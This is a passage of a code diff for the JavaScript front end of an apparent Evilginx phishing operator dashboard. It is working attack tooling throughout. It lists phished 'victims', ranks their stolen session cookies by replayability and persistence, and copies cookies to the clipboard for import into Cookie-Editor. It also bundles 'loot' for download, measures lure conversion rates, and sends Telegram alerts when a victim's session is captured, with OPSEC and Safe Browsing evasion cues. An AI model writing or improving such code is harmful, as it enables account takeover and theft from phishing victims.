+    url_empty_active:"No live URLs.", url_empty:"Paste a lure URL above.",
+    url_saved:(a,t)=>`${a} up / ${t} saved`, confirm_del:"Remove this URL?",
+    url_added:"URL saved", url_copied:"Copied", no_active:"None are up", active_copied:n=>`${n} URLs copied`,
+    set_title:"Telegram",
+    set_sub:"Ping when a replayable session lands, or a host dies. Saved here, no restart.",
+    set_enable:"Send alerts", bot_token:"Bot token", chat_id:"Chat ID",
+    minimal:"Don't put the account or IP in the message",
+    save_btn:"Save", send_test:"Send test", token_saved:"saved — leave blank to keep",
+    set_note:'1. @BotFather → /newbot → token.<br>2. Message the bot, open <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code>, copy chat id.<br>3. Save, then send a test.',
+    settings_saved:"Saved", test_sent:"Test sent", error:"Error",
+    vstate_saved:"Saved", copied_paste:id=>`#${id} cookies on the clipboard. Cookie-Editor or StorageAce.`,
+    new_sessions:n=>`${n} new capture(s)`, load_err:"Could not load",
+    health_up:"Evilginx up", health_down:"Evilginx not seen",
+    last_capture:"last capture", no_captures:"no captures",
+    sb_on:'Safe Browsing on — URLs go to Google',
+    sb_off:'Safe Browsing off',
+    flagged:"flagged", mip_title:n=>`same account from ${n} IPs — cookie may bounce on conditional access`,
     ago:(n,u)=>`${n}${u} ago`,
+    facts:(p,r,h,st,last)=>`${p} accounts · <b>${r} replayable</b> · ${h} captures · ${st} · ${last}`,
+    help_title:"Keys",
+    help_items:[["/","search"],["1–5","switch view"],["j k","move"],["c","copy cookies"],["r","refresh"],["?","this list"],["esc","close"]],
+    tokens:"Tokens", password:"Password", copy_user:"Copy account",
   },
   es: {
-    search_ph:"Buscar usuario / IP…  (/)", refresh:"↻ Actualizar", auto:"Auto", loot:"⬇ Loot", csv:"⬇ CSV",
-    loot_t:"Descargar todas las cookies de víctimas válidas (zip)", csv_t:"CSV de sesiones para el informe (sin secretos)",
-    tab_victims:"Víctimas", tab_sessions:"Todas las sesiones", tab_lures:"Lures", tab_urls:"Mis URLs", tab_settings:"Ajustes",
-    domains:"Dominios", all_phishlets:"Todos los phishlets", only_valid:"Solo con sesión válida", show_noise:"Mostrar visitas sin usuario",
-    kpi_unique:"Víctimas únicas", kpi_valid:"Con sesión válida", kpi_creds:"Con credenciales", kpi_nologin:"Visitas sin login",
-    kpi_phishlets:"Phishlets", kpi_total:"Sesiones totales",
-    th_user:"Usuario", th_phishlet:"Phishlet", th_session:"Sesión", th_cookies:"Cookies", th_attempts:"Intentos",
-    th_lastip:"Última IP", th_seen:"Visto", th_loot:"Loot", th_pass:"Password", th_ip:"IP", th_captured:"Capturado",
-    valid:"válida", no:"no", used:"usada", dup:"dup", copy_cookies:"copiar cookies", view_cookies:"ver cookies",
-    of:"de", victims_l:"víctimas", sessions_l:"sesiones", empty_victims:"Sin víctimas que coincidan con el filtro.",
-    empty_sessions:"Sin sesiones que coincidan.", best_session:"Mejor sesión", cookies_w:"cookies", invalid:"no válida",
-    useragent:"User-Agent", landing:"Landing", attempts_h:"Intentos", mark_used:"Marcar como usada",
-    notes_ph:"notas (cookies reusadas, MFA ok, rebotó...)", save:"guardar", loading:"cargando…",
-    tl_valid:"válidas · 14d", tl_title:"válidas",
-    lure_col:"Lure (landing URL)", visits_col:"Visitas", valid_col:"Válidas", victims_col:"Víctimas", conv_col:"Conversión",
-    no_lures:"Sin datos de lures.", unknown:"(desconocido)",
-    url_ph:"https://login.tu-dominio.com/xxxx", label_ph:"etiqueta (opcional)", add:"+ Añadir", active_only:"Solo activas",
-    copy_active:"Copiar activas", active:"activa", down:"caída", copy:"copiar", delete:"borrar",
-    url_empty_active:"No hay URLs activas ahora mismo.", url_empty:"Añade tus URLs de lure arriba.",
-    url_saved:(a,t)=>`${a} activas / ${t} guardadas`, confirm_del:"¿Borrar esta URL de la lista?",
-    url_added:"URL añadida", url_copied:"URL copiada", no_active:"No hay URLs activas", active_copied:n=>`${n} URLs activas copiadas`,
-    set_title:"Alertas de Telegram",
-    set_sub:"Recibe un aviso cuando cae una víctima con sesión válida o cuando un dominio se cae. Se configura aquí, sin reiniciar nada.",
-    set_enable:"Activar alertas de Telegram", bot_token:"Bot token", chat_id:"Chat ID",
-    minimal:"Alertas mínimas: no incluir usuario ni IP de la víctima (recomendado OPSEC)",
-    save_btn:"Guardar", send_test:"Enviar test", token_saved:"•••••• guardado (deja vacío para no cambiarlo)",
-    set_note:'Cómo obtener los datos:<br>1. Crea un bot con <code>@BotFather</code> → <code>/newbot</code> → te da el <b>token</b>.<br>2. Escribe algo a tu bot y abre <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code>, copia el <b>chat id</b> (o usa <code>@userinfobot</code>).<br>3. Guarda, y pulsa "Enviar test".',
-    settings_saved:"Ajustes guardados", test_sent:"Test enviado — revisa Telegram", error:"Error",
-    vstate_saved:"Estado de víctima guardado",
-    copied_paste:id=>`Cookies de la sesión ${id} copiadas. Pégalas en Cookie-Editor / StorageAce.`,
-    new_sessions:n=>`${n} sesión(es) nueva(s) capturada(s)`, load_err:"Error cargando datos",
-    updated:"actualizado", health_up:"● Evilginx activo", health_down:"● Evilginx no detectado",
-    last_capture:"última captura", no_captures:"sin capturas", sessions_phishlets:(s,p)=>`${s} sesiones · ${p} phishlets`,
-    sb_on:'Safe Browsing: <span style="color:var(--warn)">ON ⚠ (tus URLs se envían a Google)</span>',
-    sb_off:'Safe Browsing: <span style="color:var(--ok)">OFF</span>',
-    flagged:"flaggeado ⚠", mip_title:n=>`misma cuenta desde ${n} IPs distintas; la cookie puede rebotar por conditional access`,
+    search_ph:"cuenta, IP, token…", refresh:"Actualizar", auto:"En vivo", loot:"Loot zip", csv:"CSV",
+    loot_t:"Cookies de cada cuenta rejugable", csv_t:"CSV enmascarado para el informe",
+    tab_victims:"Cuentas", tab_sessions:"Capturas", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Ajustes",
+    domains:"Hosts", all_phishlets:"Todos los phishlets", only_valid:"Solo rejugables", show_noise:"Incluir visitas sin login",
+    th_user:"Cuenta", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
+    th_lastip:"IP", th_seen:"Visto", th_pass:"Password", th_captured:"Capturado",
+    kind_msa:"MSA", kind_entra:"Entra", kind_none:"—", persist:"persist", used:"usada",
+    of:"de", victims_l:"cuentas", sessions_l:"capturas", empty_victims:"Nada coincide.",
+    empty_sessions:"Nada coincide.", empty_insp:"Selecciona una fila. c copia las cookies.",
+    best_session:"Mejor captura", cookies_w:"cookies", useragent:"User-Agent", landing:"Landing",
+    attempts_h:"Capturas", mark_used:"Usada", notes_ph:"notas (rejugada, MFA, rebotó…)", save:"Guardar notas",
+    loading:"cargando…", copy_cookies:"Copiar cookies", view_json:"JSON", view_cookies:"Nombres",
+    lure_col:"Lure", visits_col:"Visitas", valid_col:"Rejugables", victims_col:"Cuentas", conv_col:"Conversión",
+    no_lures:"Sin lures todavía.", unknown:"(desconocido)",
+    url_ph:"https://login.tu-dominio.com/xxxx", label_ph:"etiqueta", add:"Añadir", active_only:"Solo arriba",
+    copy_active:"Copiar vivas", active:"arriba", down:"caída", copy:"Copiar", delete:"Quitar",
+    url_empty_active:"Ninguna URL arriba.", url_empty:"Pega un lure arriba.",
+    url_saved:(a,t)=>`${a} arriba / ${t} guardadas`, confirm_del:"¿Quitar esta URL?",
+    url_added:"URL guardada", url_copied:"Copiado", no_active:"Ninguna está arriba", active_copied:n=>`${n} URLs copiadas`,
+    set_title:"Telegram",
+    set_sub:"Aviso cuando cae una sesión rejugable o se cae un host. Se guarda aquí, sin reiniciar.",
+    set_enable:"Enviar alertas", bot_token:"Bot token", chat_id:"Chat ID",
+    minimal:"No poner la cuenta ni la IP en el mensaje",
+    save_btn:"Guardar", send_test:"Enviar test", token_saved:"guardado — vacío para no cambiarlo",
+    set_note:'1. @BotFather → /newbot → token.<br>2. Escribe al bot, abre <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code>, copia el chat id.<br>3. Guarda y envía un test.',
+    settings_saved:"Guardado", test_sent:"Test enviado", error:"Error",
+    vstate_saved:"Guardado", copied_paste:id=>`Cookies de #${id} en el portapapeles. Cookie-Editor o StorageAce.`,
+    new_sessions:n=>`${n} captura(s) nueva(s)`, load_err:"No se pudo cargar",
+    health_up:"Evilginx arriba", health_down:"Evilginx no visto",
+    last_capture:"última captura", no_captures:"sin capturas",
+    sb_on:'Safe Browsing on — las URLs van a Google',
+    sb_off:'Safe Browsing off',
+    flagged:"flaggeado", mip_title:n=>`misma cuenta desde ${n} IPs — la cookie puede rebotar por conditional access`,
     ago:(n,u)=>`hace ${n}${u}`,
+    facts:(p,r,h,st,last)=>`${p} cuentas · <b>${r} rejugables</b> · ${h} capturas · ${st} · ${last}`,
+    help_title:"Teclas",
+    help_items:[["/","buscar"],["1–5","cambiar vista"],["j k","mover"],["c","copiar cookies"],["r","actualizar"],["?","esta lista"],["esc","cerrar"]],
+    tokens:"Tokens", password:"Password", copy_user:"Copiar cuenta",
   }
 };
+
 let LANG = 'en';
-try{ const s=localStorage.getItem('ghostloot_lang'); if(s==='es'||s==='en') LANG=s; }catch(e){}
-function t(k){ const v=(I18N[LANG]&&I18N[LANG][k])??I18N.en[k]; return v===undefined?k:v; }
+try {
+  const s = localStorage.getItem('ghostloot_lang');
+  if (s === 'es' || s === 'en') LANG = s;
+  else if ((navigator.language || '').startsWith('es')) LANG = 'es';
+} catch (e) {}
+function t(k) { const v = (I18N[LANG] && I18N[LANG][k]) ?? I18N.en[k]; return v === undefined ? k : v; }
 
 const state = {
-  raw: [], tab:'victims', q:'', phishlet:'', onlyValid:false, showNoise:false,
-  sort:{key:'update',dir:-1}, auto:false, timer:null, knownIds:new Set(), firstLoad:true, sig:'',
+  raw: [], tab: 'victims', q: '', phishlet: '', onlyValid: false, showNoise: false,
+  sort: { key: 'update', dir: -1 }, auto: false, timer: null, knownIds: new Set(), firstLoad: true, sig: '',
+  sel: null, rows: [],
 };
 const $ = s => document.querySelector(s);
-const esc = s => (s==null?'':String(s)).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const esc = s => (s == null ? '' : String(s)).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
 
-function relTime(ts){
-  if(!ts) return '-';
-  const d = Date.now()/1000 - ts;
-  if(d < 60) return t('ago')(Math.floor(d),'s');
-  if(d < 3600) return t('ago')(Math.floor(d/60),'m');
-  if(d < 86400) return t('ago')(Math.floor(d/3600),'h');
-  return t('ago')(Math.floor(d/86400),'d');
+function relTime(ts) {
+  if (!ts) return '—';
+  const d = Date.now() / 1000 - ts;
+  if (d < 60) return t('ago')(Math.max(0, Math.floor(d)), 's');
+  if (d < 3600) return t('ago')(Math.floor(d / 60), 'm');
+  if (d < 86400) return t('ago')(Math.floor(d / 3600), 'h');
+  return t('ago')(Math.floor(d / 86400), 'd');
 }
-function absTime(ts){ if(!ts) return ''; return new Date(ts*1000).toLocaleString(LANG==='es'?'es-ES':'en-US'); }
-function toast(msg){ const el=$('#toast'); el.textContent=msg; el.classList.add('show'); clearTimeout(el._t); el._t=setTimeout(()=>el.classList.remove('show'),2200); }
+function absTime(ts) { if (!ts) return ''; return new Date(ts * 1000).toLocaleString(LANG === 'es' ? 'es-ES' : 'en-US'); }
+function toast(msg) { const el = $('#toast'); el.textContent = msg; el.classList.add('show'); clearTimeout(el._t); el._t = setTimeout(() => el.classList.remove('show'), 2200); }
 
-function applyStatic(){
+function kindLabel(s) {
+  if (s && s.kind === 'msa') return { cls: 'msa', text: t('kind_msa') };
+  if (s && s.kind === 'entra') return { cls: 'entra', text: t('kind_entra') };
+  return { cls: 'none', text: t('kind_none') };
+}
+function kindCell(s) {
+  const k = kindLabel(s);
+  const persist = s && s.persistent ? `<span class="persist">${t('persist')}</span>` : '';
+  return `<span class="kind ${k.cls}">${k.text}</span>${persist}`;
+}
+
+function applyStatic() {
   document.documentElement.lang = LANG;
   $('#q').placeholder = t('search_ph');
   $('#refresh').textContent = t('refresh');
   $('#autolbl').textContent = t('auto');
   $('#loot').textContent = t('loot'); $('#loot').title = t('loot_t');
   $('#csv').textContent = t('csv'); $('#csv').title = t('csv_t');
-  $('#langbtn').textContent = LANG==='en' ? 'ES' : 'EN';
+  $('#langbtn').textContent = LANG === 'en' ? 'ES' : 'EN';
   document.querySelector('[data-tab="victims"]').textContent = t('tab_victims');
   document.querySelector('[data-tab="sessions"]').textContent = t('tab_sessions');
   document.querySelector('[data-tab="lures"]').textContent = t('tab_lures');
@@ -303,371 +415,459 @@ function applyStatic(){
   document.querySelector('[data-tab="settings"]').textContent = t('tab_settings');
   $('#fvalid_l').textContent = t('only_valid');
   $('#fnoise_l').textContent = t('show_noise');
+  $('#help_title').textContent = t('help_title');
+  $('#help_dl').innerHTML = t('help_items').map(([k, v]) => `<dt>${esc(k)}</dt><dd>${esc(v)}</dd>`).join('');
 }
 
-// ---- grouping ----
-function victims(){
+function victims() {
   const m = new Map();
-  for(const s of state.raw){
-    const u = (s.username||'').trim(); if(!u) continue;
+  for (const s of state.raw) {
+    const u = (s.username || '').trim(); if (!u) continue;
     const key = u.toLowerCase();
     let v = m.get(key);
-    if(!v){ v={username:u,phishlets:new Set(),sessions:[],valid:false,creds:false,best:null,lastUpdate:0,lastIP:''}; m.set(key,v); }
+    if (!v) { v = { username: u, phishlets: new Set(), sessions: [], valid: false, creds: false, best: null, lastUpdate: 0, lastIP: '' }; m.set(key, v); }
     v.phishlets.add(s.phishlet); v.sessions.push(s);
-    if(s.valid) v.valid=true; if(s.password) v.creds=true;
-    if(s.update>v.lastUpdate){ v.lastUpdate=s.update; v.lastIP=s.remote_addr; }
-    if(!v.best) v.best=s; else{ const b=v.best;
-      const better=(s.valid&&!b.valid)||(s.valid===b.valid&&s.cookies>b.cookies)||(s.valid===b.valid&&s.cookies===b.cookies&&s.update>b.update);
-      if(better) v.best=s; }
+    if (s.valid) v.valid = true; if (s.password) v.creds = true;
+    if (s.update > v.lastUpdate) { v.lastUpdate = s.update; v.lastIP = s.remote_addr; }
+    if (!v.best) v.best = s;
+    else {
+      const b = v.best;
+      const better = (s.valid && !b.valid)
+        || (s.valid === b.valid && s.persistent && !b.persistent)
+        || (s.valid === b.valid && !!s.persistent === !!b.persistent && s.cookies > b.cookies)
+        || (s.valid === b.valid && !!s.persistent === !!b.persistent && s.cookies === b.cookies && s.update > b.update);
+      if (better) v.best = s;
+    }
   }
-  return [...m.values()].map(v=>({...v,phishlets:[...v.phishlets]}));
+  return [...m.values()].map(v => ({ ...v, phishlets: [...v.phishlets], kind: v.best && v.best.kind, persistent: v.best && v.best.persistent, cookies: v.best ? v.best.cookies : 0 }));
 }
-function noiseCount(){ return state.raw.filter(s=>!(s.username||'').trim()).length; }
+function noiseCount() { return state.raw.filter(s => !(s.username || '').trim()).length; }
 
-function applyFilter(list, keyUser, keyPhl){
+function applyFilter(list, keyUser, keyPhl) {
   const q = state.q.toLowerCase();
-  return list.filter(x=>{
-    if(state.phishlet){ const p=keyPhl(x); const ok=Array.isArray(p)?p.includes(state.phishlet):p===state.phishlet; if(!ok) return false; }
-    if(state.onlyValid && !x.valid) return false;
-    if(q){ const hay=(keyUser(x)+' '+(x.lastIP||x.remote_addr||'')).toLowerCase(); if(!hay.includes(q)) return false; }
+  return list.filter(x => {
+    if (state.phishlet) { const p = keyPhl(x); const ok = Array.isArray(p) ? p.includes(state.phishlet) : p === state.phishlet; if (!ok) return false; }
+    if (state.onlyValid && !x.valid) return false;
+    if (q) {
+      const extra = [x.lastIP, x.remote_addr, x.token, x.kind, ...(x.tokens || []), ...(x.best && x.best.tokens || [])].filter(Boolean).join(' ');
+      const hay = (keyUser(x) + ' ' + extra).toLowerCase();
+      if (!hay.includes(q)) return false;
+    }
     return true;
   });
 }
-function sortList(list, getters){
-  const {key,dir}=state.sort; const g=getters[key]; if(!g) return list;
-  return list.slice().sort((a,b)=>{ let x=g(a),y=g(b); if(typeof x==='string'){x=x.toLowerCase();y=(y||'').toLowerCase();} if(x<y) return -1*dir; if(x>y) return 1*dir; return 0; });
-}
-function kpiHTML(items){ return items.map(i=>`<div class="kpi ${i.c||''} ${i.n===0?'n0':''}"><span class="bar"></span><div class="n">${i.n}</div><div class="l">${i.l}</div></div>`).join(''); }
-
-function render(){
-  const tab=state.tab;
-  document.querySelectorAll('.tab').forEach(x=>x.classList.toggle('on', x.dataset.tab===tab));
-  const isTable=(tab==='victims'||tab==='sessions');
-  $('#kpis').style.display=isTable?'':'none';
-  document.querySelector('.filters').style.display=isTable?'':'none';
-  document.querySelector('.wrap').style.display=isTable?'':'none';
-  $('#urlsview').hidden=tab!=='urls'; $('#settingsview').hidden=tab!=='settings'; $('#luresview').hidden=tab!=='lures';
-  if(tab==='urls'){ $('#timeline').style.display='none'; renderUrls(); return; }
-  if(tab==='settings'){ $('#timeline').style.display='none'; renderSettings(); return; }
-  if(tab==='lures'){ $('#timeline').style.display='none'; renderLures(); return; }
-  renderTimeline();
-  $('#fnoisewrap').style.display = tab==='sessions' ? '' : 'none';
-  if(tab==='victims') renderVictims(); else renderSessions();
+function sortList(list, getters) {
+  const { key, dir } = state.sort; const g = getters[key]; if (!g) return list;
+  return list.slice().sort((a, b) => { let x = g(a), y = g(b); if (typeof x === 'string') { x = x.toLowerCase(); y = (y || '').toLowerCase(); } if (x < y) return -1 * dir; if (x > y) return 1 * dir; return 0; });
 }
 
-function renderTimeline(){
-  const el=$('#timeline');
-  const valid=(state.raw||[]).filter(s=>s.valid && s.update);
-  if(!valid.length){ el.style.display='none'; return; }
-  const key=d=>new Date(d).toISOString().slice(0,10);
-  const now=new Date(); const days=[];
-  for(let i=13;i>=0;i--){ const d=new Date(now); d.setDate(now.getDate()-i); days.push(d); }
-  const counts={}; valid.forEach(s=>{ const k=key(s.update*1000); counts[k]=(counts[k]||0)+1; });
-  const max=Math.max(1,...days.map(d=>counts[key(d)]||0));
-  el.style.display='flex';
-  el.innerHTML='<span class="tlab">'+t('tl_valid')+'</span>'+days.map(d=>{
-    const c=counts[key(d)]||0; const h=Math.max(2,Math.round((c/max)*34));
-    return `<div class="bwrap" title="${key(d)}: ${c} ${t('tl_title')}"><div class="bl">${c||''}</div><div class="bar" style="height:${h}px;${c?'':'opacity:.2'}"></div></div>`;
-  }).join('');
+function renderFacts() {
+  const all = victims();
+  const replay = all.filter(v => v.valid).length;
+  const st = window._health && window._health.evilginx_up
+    ? `<span class="ok">${t('health_up')}</span>`
+    : `<span class="bad">${t('health_down')}</span>`;
+  const last = window._health && window._health.last_capture ? t('last_capture') + ' ' + relTime(window._health.last_capture) : t('no_captures');
+  $('#facts').innerHTML = t('facts')(all.length, replay, state.raw.length, st, last);
 }
 
-function renderLures(){
-  const m=new Map();
-  for(const s of (state.raw||[])){
-    const u=s.landing_url||t('unknown');
-    let e=m.get(u); if(!e){ e={url:u,visits:0,valid:0,users:new Set()}; m.set(u,e); }
-    e.visits++; if(s.valid) e.valid++; if(s.username) e.users.add(s.username.toLowerCase());
+function render() {
+  const tab = state.tab;
+  document.querySelectorAll('.rail [data-tab]').forEach(x => x.classList.toggle('on', x.dataset.tab === tab));
+  const isTable = tab === 'victims' || tab === 'sessions';
+  $('#toolbar').style.display = isTable ? '' : 'none';
+  $('#stage').style.display = isTable ? '' : 'none';
+  $('#urlsview').hidden = tab !== 'urls';
+  $('#settingsview').hidden = tab !== 'settings';
+  $('#luresview').hidden = tab !== 'lures';
+  renderFacts();
+  if (tab === 'urls') { renderUrls(); return; }
+  if (tab === 'settings') { renderSettings(); return; }
+  if (tab === 'lures') { renderLures(); return; }
+  $('#fnoisewrap').style.display = tab === 'sessions' ? '' : 'none';
+  if (tab === 'victims') renderVictims(); else renderSessions();
+  renderInspector();
+}
+
+function renderLures() {
+  const m = new Map();
+  for (const s of (state.raw || [])) {
+    const u = s.landing || t('unknown');
+    let e = m.get(u); if (!e) { e = { url: u, visits: 0, valid: 0, users: new Set() }; m.set(u, e); }
+    e.visits++; if (s.valid) e.valid++; if (s.username) e.users.add(s.username.toLowerCase());
   }
-  const rows=[...m.values()].sort((a,b)=>b.valid-a.valid||b.visits-a.visits);
+  const rows = [...m.values()].sort((a, b) => b.valid - a.valid || b.visits - a.visits);
   $('#luresview').innerHTML =
-    `<div class="wrap"><table><thead><tr>
+    `<table><thead><tr>
        <th>${t('lure_col')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th>${t('victims_col')}</th><th>${t('conv_col')}</th>
-     </tr></thead><tbody>`+
-    (rows.length?rows.map(e=>{ const conv=e.visits?Math.round(e.valid/e.visits*100):0;
-      return `<tr><td style="font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--acc);word-break:break-all">${esc(e.url)}</td>
+     </tr></thead><tbody>` +
+    (rows.length ? rows.map(e => {
+      const conv = e.visits ? Math.round(e.valid / e.visits * 100) : 0;
+      return `<tr><td class="num" style="color:var(--copper);word-break:break-all">${esc(e.url)}</td>
         <td class="num">${e.visits}</td><td class="num">${e.valid}</td><td class="num">${e.users.size}</td><td class="num">${conv}%</td></tr>`;
-    }).join(''):`<tr><td colspan="5" class="empty">${t('no_lures')}</td></tr>`)+`</tbody></table></div>`;
+    }).join('') : `<tr><td colspan="5" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
 }
 
-async function loadVState(){ try{ window._vstate=await (await fetch('/api/vstate')).json()||{}; }catch(e){ window._vstate={}; } }
-async function loadHealth(){
-  try{
-    const h=await (await fetch('/api/health')).json();
-    const up=h.evilginx_up?`<span style="color:var(--ok)">${t('health_up')}</span>`:`<span style="color:var(--bad)">${t('health_down')}</span>`;
-    const last=h.last_capture?t('last_capture')+' '+relTime(h.last_capture):t('no_captures');
-    const kb=(h.db_size_bytes/1024).toFixed(0);
-    $('#foothealth').innerHTML=`${up} · ${last} · db ${kb} KB · v${h.version}`;
-    const dot=document.querySelector('.brand .dot'); if(dot) dot.style.background=h.evilginx_up?'var(--ok)':'var(--bad)';
-  }catch(e){}
+async function loadVState() { try { window._vstate = await (await fetch('/api/vstate')).json() || {}; } catch (e) { window._vstate = {}; } }
+async function loadHealth() {
+  try {
+    const h = await (await fetch('/api/health')).json();
+    window._health = h;
+    const up = h.evilginx_up ? `<span style="color:var(--olive)">${t('health_up')}</span>` : `<span style="color:var(--bad)">${t('health_down')}</span>`;
+    const last = h.last_capture ? t('last_capture') + ' ' + relTime(h.last_capture) : t('no_captures');
+    const kb = (h.db_size_bytes / 1024).toFixed(0);
+    $('#foothealth').innerHTML = `${up} · ${last} · db ${kb} KB · v${h.version}`;
+  } catch (e) {}
 }
 
-function renderVictims(){
-  const all=victims();
-  const filtered=applyFilter(all, v=>v.username, v=>v.phishlets);
-  const getters={ user:v=>v.username, phishlet:v=>v.phishlets.join(','), valid:v=>v.valid?1:0, cookies:v=>v.best?v.best.cookies:0, attempts:v=>v.sessions.length, update:v=>v.lastUpdate };
-  const rows=sortList(filtered,getters);
-  $('#kpis').innerHTML=kpiHTML([
-    {n:all.length,l:t('kpi_unique'),c:'b'},
-    {n:all.filter(v=>v.valid).length,l:t('kpi_valid'),c:'g'},
-    {n:all.filter(v=>v.creds).length,l:t('kpi_creds'),c:'p'},
-    {n:noiseCount(),l:t('kpi_nologin'),c:'w'},
-    {n:new Set(state.raw.map(s=>s.phishlet)).size,l:t('kpi_phishlets')},
+function th(cols) {
+  return '<tr>' + cols.map(([k, label, sortable]) => {
+    const sorted = sortable && state.sort.key === k; const ar = sorted ? (state.sort.dir < 0 ? '▾' : '▴') : '';
+    return `<th class="${sorted ? 'sorted' : ''}" ${sortable ? `data-sort="${k}"` : ''}>${label} ${ar}</th>`;
+  }).join('') + '</tr>';
+}
+
+function renderVictims() {
+  const all = victims();
+  const filtered = applyFilter(all, v => v.username, v => v.phishlets);
+  const getters = { user: v => v.username, phishlet: v => v.phishlets.join(','), valid: v => v.valid ? 1 : 0, cookies: v => v.cookies, attempts: v => v.sessions.length, update: v => v.lastUpdate };
+  const rows = sortList(filtered, getters);
+  state.rows = rows.map(v => ({ type: 'victim', key: v.username.toLowerCase(), data: v }));
+  $('#thead').innerHTML = th([
+    ['user', t('th_user'), true], ['phishlet', t('th_phishlet'), true], ['valid', t('th_loot'), true],
+    ['cookies', t('th_cookies'), true], ['attempts', t('th_attempts'), true], ['', t('th_lastip'), false], ['update', t('th_seen'), true]
   ]);
-  $('#thead').innerHTML=th([
-    ['','',false],['user',t('th_user'),true],['phishlet',t('th_phishlet'),true],['valid',t('th_session'),true],
-    ['cookies',t('th_cookies'),true],['attempts',t('th_attempts'),true],['',t('th_lastip'),false],['update',t('th_seen'),true],['',t('th_loot'),false]
-  ]);
-  $('#tbody').innerHTML = rows.length ? rows.map(v=>{
-    const b=v.best; const rid='v_'+b.id;
-    const vst=(window._vstate||{})[v.username.toLowerCase()]||{};
-    const ips=new Set(v.sessions.map(s=>s.remote_addr).filter(Boolean)); const multiIp=ips.size>1;
-    return `<tr>
-      <td><span class="exp" data-exp="${rid}">▸</span></td>
+  $('#tbody').innerHTML = rows.length ? rows.map(v => {
+    const vst = (window._vstate || {})[v.username.toLowerCase()] || {};
+    const ips = new Set(v.sessions.map(s => s.remote_addr).filter(Boolean));
+    const sel = state.sel && state.sel.type === 'victim' && state.sel.key === v.username.toLowerCase();
+    return `<tr data-sel="victim:${esc(v.username.toLowerCase())}" class="${sel ? 'sel' : ''}">
       <td class="u">${esc(v.username)}</td>
-      <td>${v.phishlets.map(p=>`<span class="phl">${esc(p)}</span>`).join('')}</td>
-      <td>${v.valid?`<span class="pill ok">${t('valid')}</span>`:`<span class="pill bad">${t('no')}</span>`}${vst.used?`<span class="badge used">${t('used')}</span>`:''}${multiIp?`<span class="badge mip" title="${t('mip_title')(ips.size)}">multi-IP</span>`:''}</td>
-      <td class="num">${b.cookies}</td>
-      <td class="num">${v.sessions.length}${v.sessions.length>1?` <span class="mut">(${t('dup')})</span>`:''}</td>
+      <td class="phl">${v.phishlets.map(esc).join(', ')}</td>
+      <td>${kindCell(v.best)}${vst.used ? `<span class="mark">${t('used')}</span>` : ''}${ips.size > 1 ? `<span class="mark" title="${t('mip_title')(ips.size)}">${ips.size} IPs</span>` : ''}</td>
+      <td class="num">${v.cookies}</td>
+      <td class="num">${v.sessions.length}</td>
       <td class="mut">${esc(v.lastIP)}</td>
-      <td title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
-      <td>${b.cookies?loot(b.id):'<span class="mut">-</span>'}</td>
-    </tr>
-    <tr class="detail" id="${rid}" hidden><td colspan="9"><div class="inner">
-      <div class="dgrid">
-        <div><div class="k">${t('best_session')}</div><div class="v">#${b.id} · ${b.cookies} ${t('cookies_w')} · ${b.valid?t('valid'):t('invalid')}</div></div>
-        <div><div class="k">${t('useragent')}</div><div class="v">${esc(b.useragent)}</div></div>
-        <div><div class="k">${t('landing')}</div><div class="v">${esc(b.landing)}</div></div>
+      <td class="mut" title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
+    </tr>`;
+  }).join('') : `<tr><td colspan="7" class="empty">${t('empty_victims')}</td></tr>`;
+  $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('victims_l')}`;
+  if (!state.sel && rows[0]) state.sel = { type: 'victim', key: rows[0].username.toLowerCase() };
+}
+
+function renderSessions() {
+  let all = state.raw.slice();
+  if (!state.showNoise) all = all.filter(s => (s.username || '').trim());
+  const filtered = applyFilter(all, s => s.username, s => s.phishlet);
+  const getters = { id: s => s.id, phishlet: s => s.phishlet, user: s => s.username || '', valid: s => s.valid ? 1 : 0, cookies: s => s.cookies, update: s => s.update };
+  const rows = sortList(filtered, getters);
+  state.rows = rows.map(s => ({ type: 'session', key: String(s.id), data: s }));
+  $('#thead').innerHTML = th([
+    ['id', '#', true], ['phishlet', t('th_phishlet'), true], ['user', t('th_user'), true], ['', t('th_pass'), false],
+    ['valid', t('th_loot'), true], ['cookies', t('th_cookies'), true], ['', t('th_lastip'), false], ['update', t('th_captured'), true]
+  ]);
+  $('#tbody').innerHTML = rows.length ? rows.map(s => {
+    const sel = state.sel && state.sel.type === 'session' && state.sel.key === String(s.id);
+    return `<tr data-sel="session:${s.id}" class="${sel ? 'sel' : ''}${state.knownIds.size && !state.knownIds.has(s.id) ? ' new' : ''}">
+      <td class="num">${s.id}</td>
+      <td class="phl">${esc(s.phishlet)}</td>
+      <td>${esc(s.username) || '<span class="mut">—</span>'}</td>
+      <td>${s.password ? '·' : '<span class="mut">—</span>'}</td>
+      <td>${kindCell(s)}</td>
+      <td class="num">${s.cookies}</td>
+      <td class="mut">${esc(s.remote_addr)}</td>
+      <td class="mut" title="${absTime(s.update)}">${relTime(s.update)}</td>
+    </tr>`;
+  }).join('') : `<tr><td colspan="8" class="empty">${t('empty_sessions')}</td></tr>`;
+  $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('sessions_l')}`;
+  if (!state.sel && rows[0]) state.sel = { type: 'session', key: String(rows[0].id) };
+}
+
+function currentSel() {
+  if (!state.sel) return null;
+  return state.rows.find(r => r.type === state.sel.type && r.key === state.sel.key) || null;
+}
+
+function renderInspector() {
+  const box = $('#inspector');
+  const row = currentSel();
+  if (!row) { box.innerHTML = `<div class="empty-insp">${t('empty_insp')}</div>`; return; }
+  if (row.type === 'victim') {
+    const v = row.data; const b = v.best;
+    const vst = (window._vstate || {})[v.username.toLowerCase()] || {};
+    const ips = [...new Set(v.sessions.map(s => s.remote_addr).filter(Boolean))];
+    box.innerHTML = `
+      <h2>${esc(v.username)}</h2>
